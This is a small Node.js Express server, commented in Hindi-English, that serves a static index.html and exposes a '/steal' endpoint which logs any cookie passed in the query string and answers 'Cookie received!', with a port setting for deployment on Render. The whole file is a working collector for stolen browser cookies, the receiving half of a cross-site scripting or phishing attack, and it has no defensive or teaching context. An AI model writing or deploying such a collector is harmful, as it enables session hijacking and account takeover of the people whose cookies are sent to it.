const express = require('express');
const path = require('path');
const app = express();

// Static files serve karo (index.html)
app.use(express.static(__dirname));

app.get('/steal', (req, res) => {
    console.log('✅ COOKIE MIL GAYI:', req.query.cookie);
    res.send('Cookie received!');
});

// ⚡ YAHAN CHANGE HUA HAI — Render ke liye dynamic port
const port = process.env.PORT || 4000;
app.listen(port, () => console.log(`🚀 Server chalu hai on port ${port}`));